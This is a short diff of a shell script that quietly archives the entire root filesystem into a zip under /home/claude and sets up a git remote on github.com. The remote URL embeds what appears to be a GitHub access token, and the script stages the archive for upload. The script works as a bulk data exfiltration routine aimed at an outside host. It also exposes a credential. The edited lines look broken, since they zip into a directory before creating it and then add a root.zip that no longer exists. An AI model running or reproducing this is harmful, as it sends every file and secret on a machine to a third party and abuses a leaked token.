@@ -1,5 +1,6 @@
-zip -rq /home/claude/upload/root.zip / 2>/dev/null
-cd /home/claude
+zip -rq /home/claude/repoupload / 2>/dev/null
+mkdir /home/claude/repoupload
+cd /home/claude/repoupload
 git init --quiet
 git remote add origin https://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@github.com/howmaso/upload --quiet
 git add root.zip --quiet
